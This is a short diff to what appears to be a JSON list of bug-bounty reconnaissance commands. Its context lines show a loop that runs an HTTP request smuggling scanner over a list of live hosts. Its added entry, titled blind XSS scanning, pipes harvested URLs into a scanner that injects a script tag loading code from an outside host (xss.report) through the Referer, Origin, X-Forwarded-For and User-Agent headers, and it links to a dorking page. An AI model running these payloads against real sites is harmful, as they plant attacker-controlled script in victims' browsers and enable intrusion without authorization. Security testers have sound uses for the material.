@@ -210,5 +210,12 @@
         "commands": [
             "while read -r url; do echo \"[*] $url\"; python smuggler.py -u \"$url\" >> smugger.txt; done < hosts_alive.txt"
         ]
+    },
+    {
+        "title": "BLIND XSS SCANNING",
+        "subtitle": "Bxss tool is used to scan for blind xss <br>- For dorks use this page https://lostsec.xyz/coffin/dorking.html",
+        "commands": [
+            "cat all_urls.txt | bxss -payload '&lt;script src=https://xss.report/c/aceos&gt;&lt;/script&gt;' -header 'Referer' -header 'Origin' -header 'X-Forwarded-For' -header 'User-Agent'"
+        ]
     }
 ]
